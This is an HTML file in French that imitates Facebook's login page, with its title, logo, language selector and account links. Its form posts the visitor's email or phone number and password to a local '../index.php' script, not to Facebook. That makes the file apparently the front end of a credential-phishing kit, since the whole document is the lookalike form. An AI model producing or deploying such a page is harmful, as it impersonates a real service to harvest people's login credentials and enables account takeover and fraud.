<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion | Facebook</title>
  <link rel="stylesheet" href="../assets/css/seconnecter.css">
</head>
<body>

  <!-- Sélection de langue -->
  <div class="language">Français (France) ▼</div>

  <!-- Logo Facebook -->
  <div class="fb-logo">
    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook" />
  </div>

  <!-- Formulaire -->
  <div class="form-container">
    <form action="../index.php" method="POST">
      <input type="text" name="email" placeholder="Numéro mobile ou e-mail" required>
      <input type="password" name="password" placeholder="Mot de passe" required>
      <button type="submit">Se connecter</button>
    </form>

    <a href="#" class="forgot">Mot de passe oublié ?</a>

    <a href="inscription.php" class="create-btn">Créer un compte</a>
  </div>

</body>
</html>